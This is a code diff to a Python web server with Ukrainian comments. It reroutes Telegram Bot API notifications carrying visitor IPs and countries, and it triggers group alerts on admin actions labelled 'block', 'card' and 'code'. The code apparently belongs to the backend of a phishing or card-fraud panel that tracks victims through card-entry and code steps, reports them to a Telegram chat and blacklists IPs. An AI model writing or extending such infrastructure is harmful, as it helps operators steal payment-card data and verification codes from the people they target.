@@ -125,10 +125,8 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None):
         f"🌏 Страна: {country_full}"
     )
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data_group = {"chat_id": GROUP_ID, "text": msg}
     data_admin = {"chat_id": ADMIN_ID, "text": msg}
     try:
-        requests.post(url, data=data_group, timeout=2)
         requests.post(url, data=data_admin, timeout=2)
         if extra_user_id:
             data_user = {"chat_id": extra_user_id, "text": msg}
@@ -617,6 +615,9 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 data = json.loads(post_data)
                 action = data.get('action')
                 ip = data.get('ip')
+                # --- Тільки тут надсилаємо в групу ---
+                if action in ['block', 'card', 'code'] and ip:
+                    send_telegram_log(page=action, link='', ip=ip)  # Надсилаємо в групу і адміну
                 if action == 'block' and ip:
                     BLACKLISTED_IPS.add(ip)
                     print(f'[admin_action] Blocked IP: {ip}')
